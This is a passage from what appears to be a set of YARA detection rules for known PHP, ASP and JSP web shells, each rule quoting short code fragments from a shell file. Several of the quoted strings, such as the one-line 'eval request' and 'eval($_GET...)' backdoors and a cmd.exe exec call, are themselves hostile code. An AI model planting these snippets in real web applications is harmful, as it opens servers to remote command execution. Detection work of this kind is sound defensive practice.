      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC" 
   condition: 
      all of them
} 

rule Webshell_drag_system_RID2F48 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file system.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:50:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_" 
   condition: 
      all of them
} 

rule Webshell_DarkBlade1_3_asp_indexx_RID3355 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file indexx.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:43:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou" 
   condition: 
      all of them
} 

rule Webshell_jsp_hsxa_RID2E06 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file hsxa.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:56:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja" 
   condition: 
      all of them
} 

rule Webshell_jsp_utils_RID2E83 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file utils.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
      $s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z" 
   condition: 
      all of them
} 

rule Webshell_asp_01_RID2CAA : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 01.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:58:51"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%eval request(\"pass\")%>" fullword
   condition: 
      all of them
} 

rule Webshell_asp_404_RID2CE1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 404.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:08:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2" 
   condition: 
      all of them
} 

rule Webshell_webshell_cnseay02_1_RID31D0 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file webshell-cnseay02-1.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:38:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU" 
   condition: 
      all of them
} 

rule Webshell_php_fbi_RID2D7E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file fbi.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo" 
   condition: 
      all of them
} 

rule Webshell_cmd_asp_5_1_RID2EA1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmd-asp-5.1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:22:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
   condition: 
      all of them
} 

rule Webshell_php_dodo_zip_RID2FA5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file zip.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:06:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x" 
      $s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" 
   condition: 
      all of them
} 

rule Webshell_aZRaiLPhp_v1_0_RID2F86 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file aZRaiLPhp v1.0.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:00:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($" 
      $s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo" 
   condition: 
      all of them
} 

rule Webshell_php_list_RID2E09 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file list.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "// list.php = Directory & File Listing" fullword
      $s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena" 
      $s9 = "// by: The Dark Raver" fullword
   condition: 
      1 of them
} 

rule Webshell_ironshell_RID2E76 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ironshell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:15:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "print \"<form action=\\\"\".$me.\"?p=cmd&dir=\".realpath('.').\"" 
      $s8 = "print \"<td id=f><a href=\\\"?p=rename&file=\".realpath($file).\"&di" 
   condition: 
      all of them
} 

rule Webshell_caidao_shell_404_RID3075 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('St" 
   condition: 
      all of them
} 

rule Webshell_ASP_aspydrv_RID2EF2 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file aspydrv.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:36:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "<%=thingy.DriveLetter%> </td><td><tt> <%=thingy.DriveType%> </td><td><tt> <%=thi" 
   condition: 
      all of them
} 

rule Webshell_jsp_web_RID2D90 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file web.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:37:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%@page import=\"java.io.*\"%><%@page import=\"java.net.*\"%><%String t=request." 
   condition: 
      all of them
} 

rule Webshell_mysqlwebsh_RID2EF5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file mysqlwebsh.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:36:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#" 
   condition: 
      all of them
} 

rule Webshell_jspShell_1_RID2E7B : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file jspShell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:16:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<input type=\"checkbox\" name=\"autoUpdate\" value=\"AutoUpdate\" on" 
      $s1 = "onblur=\"document.shell.autoUpdate.checked= this.oldValue;" 
   condition: 
      all of them
} 

rule Webshell_Dx_Dx_RID2C7D : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Dx.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:51:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx" 
      $s9 = "class=linelisting><nobr>POST (php eval)</td><" 
   condition: 
      1 of them
} 

rule Webshell_asp_ntdaddy_RID2F31 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file ntdaddy.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:46:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "if  FP  =  \"RefreshFolder\"  or  " 
      $s10 = "request.form(\"cmdOption\")=\"DeleteFolder\"  " 
   condition: 
      1 of them
} 

rule Webshell_MySQL_Web_Interface_Version_0_8_RID3634 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file MySQL Web Interface Version 0.8.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:45:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>" 
   condition: 
      all of them
} 

rule Webshell_elmaliseker_2_RID2FC5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file elmaliseker.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:11:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<td<%if (FSO.GetExtensionName(path & \"\\\" & oFile.Name)=\"lnk\") or (FSO.GetEx" 
      $s6 = "<input type=button value=Save onclick=\"EditorCommand('Save')\"> <input type=but" 
   condition: 
      all of them
} 

rule Webshell_ASP_RemExp_RID2E3A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file RemExp.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:05:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=SubFolder.Name%>\"> <a href= \"<%=Reques" 
      $s1 = "Private Function ConvertBinary(ByVal SourceNumber, ByVal MaxValuePerIndex, ByVal" 
   condition: 
      all of them
} 

rule Webshell_jsp_list1_RID2E3F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file list1.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "case 's':ConnectionDBM(out,encodeChange(request.getParameter(\"drive" 
      $s9 = "return \"<a href=\\\"javascript:delFile('\"+folderReplace(file)+\"')\\\"" 
   condition: 
      all of them
} 

rule Webshell_phpkit_1_0_odd_RID2FEB : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file odd.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:17:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "include('php://input');" fullword
      $s1 = "// No eval() calls, no system() calls, nothing normally seen as malicious." fullword
      $s2 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
   condition: 
      all of them
} 

rule Webshell_asp_1_RID2C7A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 1.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "!22222222222222222222222222222222222222222222222222" fullword
      $s8 = "<%eval request(\"pass\")%>" fullword
   condition: 
      all of them
} 

rule Webshell_cmd_win32_RID2DEC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmd_win32.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:52:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam" 
      $s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
   condition: 
      2 of them
} 

rule Webshell_jsp_jshell_RID2ED4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file jshell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kXpeW[\"" fullword
      $s4 = "[7b:g0W@W<" fullword
      $s5 = "b:gHr,g<" fullword
      $s8 = "RhV0W@W<" fullword
      $s9 = "S_MR(u7b" fullword
   condition: 
      all of them
} 

rule Webshell_ASP_zehir4_RID2E3F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file zehir4.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:06:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/" 
   condition: 
      all of them
} 

rule Webshell_wsb_idc_RID2D81 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file idc.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:34:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
      $s3 = "{eval($_GET['idc']);}" fullword
   condition: 
      1 of them
} 

rule Webshell_cpg_143_incl_xpl_RID308F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cpg_143_incl_xpl.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:45:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA" 
      $s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time" 
   condition: 
      1 of them
} 

rule Webshell_mumaasp_com_RID2F38 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file mumaasp.com.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:47:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR" 
   condition: 
      all of them
} 

rule Webshell_php_404_a_RID2DA5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 404.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$pass = md5(md5(md5($pass)));" fullword
   condition: 
      all of them
} 

rule Webshell_webshell_cnseay_x_RID31B5 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file webshell-cnseay-x.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:34:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_" 
   condition: 
      all of them
} 

rule Webshell_asp_up_RID2D2E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file up.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:20:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio" 
      $s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
   condition: 
      1 of them
} 

rule Webshell_ASP_cmd_2_RID2DAE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:42:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
   condition: 
      all of them
} 

rule Webshell_PHP_g00nv13_RID2DFC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file g00nv13.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:55:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "case \"zip\": case \"tar\": case \"rar\": case \"gz\": case \"cab\": cas" 
      $s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p" 
   condition: 
      all of them
} 

rule Webshell_php_h6ss_RID2DD1 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file h6ss.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:48:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<?php eval(gzuncompress(base64_decode(\"" 
   condition: 
      all of them
} 

rule Webshell_Ani_Shell_RID2E15 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Ani-Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:59:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$Python_CODE = \"I" 
      $s6 = "$passwordPrompt = \"\\n=================================================" 
      $s7 = "fputs ($sockfd ,\"\\n===============================================" 
   condition: 
      1 of them
} 

rule Webshell_jsp_k8cmd_RID2E29 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file k8cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:02:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
   condition: 
      all of them
} 

rule Webshell_jsp_cmd_1_RID2E16 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmd.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:59:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
   condition: 
      all of them
} 

rule Webshell_jsp_k81_RID2D26 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file k81.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:19:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
      $s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
   condition: 
      1 of them
} 

rule Webshell_ASP_zehir_RID2E0B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file zehir.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:57:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&" 
   condition: 
      all of them
} 

rule Webshell_Worse_Linux_Shell_1_RID320C : DEMO LINUX T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Worse Linux Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:48:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, LINUX, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD" 
   condition: 
      all of them
} 

rule Webshell_zacosmall_RID2E6C : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file zacosmall.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:13:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>" 
   condition: 
      all of them
} 

rule Webshell_redirect_RID2DF8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file redirect.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" " 
   condition: 
      all of them
} 

rule Webshell_jsp_cmdjsp_RID2ED3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file cmdjsp.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:31:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
   condition: 
      all of them
} 

rule Webshell_Java_Shell_RID2E7F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file Java Shell.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:17:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
      $s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
   condition: 
      1 of them
} 

rule Webshell_asp_1d_RID2CDE : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file 1d.asp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:07:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO" 
   condition: 
      all of them
} 

rule Webshell_jsp_IXRbE_RID2DEC : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file IXRbE.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 10:52:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application" 
   condition: 
      all of them
} 

rule Webshell_PHP_G5_RID2C69 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file G5.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 09:48:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op" 
   condition: 
      all of them
} 

rule Webshell_PHP_r57142_RID2D62 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - file r57142.php"
